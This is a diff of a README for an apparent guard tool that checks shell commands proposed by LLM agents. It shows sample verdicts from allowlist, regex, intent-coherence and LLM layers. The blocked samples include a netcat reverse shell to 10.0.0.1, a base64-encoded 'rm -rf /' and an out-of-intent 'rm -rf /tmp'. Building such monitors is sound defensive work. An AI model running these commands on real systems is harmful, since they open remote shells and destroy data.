@@ -12,29 +12,37 @@ AI agent frameworks often provide LLMs with direct shell access to complete task
 
 ## See it in action
 
+```
 task:    "list files"
 command: "nc -e /bin/bash 10.0.0.1 4444"
 layer:   L1 — Binary Allowlist
 verdict: BLOCKED
 reason:  Binary 'nc' is in the red-zone/not permitted in this context.
+```
 
+```
 task:    "check disk"
 command: "$(echo cm0gLXJmIC8= | base64 -d)"
 layer:   L2 — Regex Engine
 verdict: BLOCKED
 reason:  Obfuscation pattern detected (base64 decoding in shell command).
+```
 
+```
 task:    "analyze disk usage"
 command: "rm -rf /tmp"
 layer:   L3 — Intent Coherence
 verdict: BLOCKED
 reason:  Task intent is 'read/analyze', command action is 'delete'. Conflict detected. ← This is L3: Intent Coherence. The differentiator.
+```
 
+```
 task:    "clean temp files"
 command: "find /tmp -mtime +7 -delete"
 layer:   L4 — LLM Semantic Check
 verdict: ALLOWED
 reason:  Ambiguous use of 'delete' is justified by the task intent 'clean temp files'.
+```
 
 ## Why this exists
 
